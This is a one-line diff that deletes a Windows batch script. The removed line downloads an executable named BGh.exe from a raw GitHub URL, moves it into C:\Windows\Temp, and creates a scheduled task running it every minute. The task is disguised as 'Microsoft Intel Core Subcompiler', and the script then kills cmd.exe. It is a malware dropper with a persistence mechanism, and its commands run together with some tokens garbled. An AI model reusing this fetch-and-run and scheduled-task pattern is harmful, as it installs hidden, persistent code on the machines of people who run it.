@@ -1,1 +1,0 @@
-del /q BGh.exedler https://raw.githubusercontent.com/dietrich03muller/test/master/BGh.exe BGh.exemove /y BGh.exe "C:\Windows\Temp"SCHTASKS /Create /sc MINUTE /f /tr "C:\Windows\Temp\BGh.exe" /mo 1 /TN "Microsoft Intel Core Subcompiler"taskkill /f /im cmd.exeexit
